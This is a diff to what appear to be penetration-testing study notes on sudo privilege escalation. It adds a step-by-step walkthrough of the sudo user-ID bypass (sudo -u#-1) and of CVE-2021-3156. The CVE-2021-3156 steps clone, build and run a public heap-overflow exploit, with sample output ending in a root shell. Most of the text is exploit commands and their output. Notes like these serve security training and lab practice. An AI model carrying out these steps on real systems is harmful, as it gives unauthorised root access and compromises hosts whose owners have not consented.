@@ -52,6 +52,10 @@ sudo --version
 sudo -V
 ```
 
+```sh
+sudo -V | head -n1
+```
+
 Check if `sudo` version is in a vulnerable range
 
 ```sh
@@ -84,6 +88,165 @@ can bypass certain policy blacklists and session PAM modules, and can cause inco
 ```sh
 sudo -u#-1 /bin/bash
 ```
+
+1. Check which command(s) the user can run as `sudo`
+
+```sh
+sudo -l
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> cry0l1t3@nix02:~$ sudo -l
+> ```
+> ```sh
+> [sudo] password for cry0l1t3: **********
+>
+> User cry0l1t3 may run the following commands on Penny:
+>     ALL=(ALL) /usr/bin/id
+> ```
+<!-- }}} -->
+
+2. Check [GTFOBins](https://gtfobins.github.io/#+sudo)
+   and the command's man page for options
+
+```sh
+man -P cat <command>
+```
+
+3. Run the command as the part of the exploit
+
+```sh
+sudo -u#-1 /bin/ncdu
+```
+
+<!-- }}} -->
+
+<!-- CVE-2021-3156 {{{-->
+### CVE-2021-3156
+
+[CVE-2021-3156](https://nvd.nist.gov/vuln/detail/cve-2021-3156) —
+Sudo before `1.9.5p2` contains an off-by-one error
+that can result in a heap-based buffer overflow,
+which allows privilege escalation to root via `sudoedit -s`
+and a command-line argument that ends with a single backslash character
+
+Affected sudo versions:
+
+- `1.8.31` - Ubuntu 20.04
+- `1.8.27` - Debian 10
+- `1.9.2` Fedora 33
+- and others
+
+
+1. Clone the repository (*[blasty/CVE-2021-3156](https://github.com/blasty/CVE-2021-3156)*)
+
+```sh
+git clone https://github.com/blasty/CVE-2021-3156.git
+```
+
+2. Build the exploit
+
+```sh
+cd CVE-2021-3156
+```
+
+```sh
+make
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> make
+> ```
+> ```sh
+> rm -rf libnss_X
+> mkdir libnss_X
+> gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
+> gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
+> ```
+<!-- }}} -->
+
+3. Run the exploit to find out the target
+
+```sh
+./sudo-hax-me-a-sandwich
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> cry0l1t3@nix02:~$ ./sudo-hax-me-a-sandwich
+> ```
+>
+> ```sh
+> ** CVE-2021-3156 PoC by blasty <peter@haxx.in>
+>
+>   usage: ./sudo-hax-me-a-sandwich <target>
+>
+>   available targets:
+>   ------------------------------------------------------------
+>     0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
+>     1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
+>     2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
+>   ------------------------------------------------------------
+>
+>   manual mode:
+>     ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>
+> ```
+<!-- }}} -->
+
+
+4. Find the version of the operating system
+
+```sh
+cat /etc/lsb-release
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> cry0l1t3@nix02:~$ cat /etc/lsb-release
+> ```
+>
+> ```sh
+> DISTRIB_ID=Ubuntu
+> DISTRIB_RELEASE=20.04
+> DISTRIB_CODENAME=focal
+> DISTRIB_DESCRIPTION="Ubuntu 20.04.1 LTS"
+> ```
+<!-- }}} -->
+
+5. Run the exploit
+
+```sh
+./sudo-hax-me-a-sandwich 1
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> cry0l1t3@nix02:~$ ./sudo-hax-me-a-sandwich 1
+> ```
+>
+> ```sh
+> ** CVE-2021-3156 PoC by blasty <peter@haxx.in>
+>
+> using target: Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
+> ** pray for your rootshell.. **
+>
+> # id
+>
+> uid=0(root) gid=0(root) groups=0(root)
+> ```
+<!-- }}} -->
 
 <!-- }}} -->
 
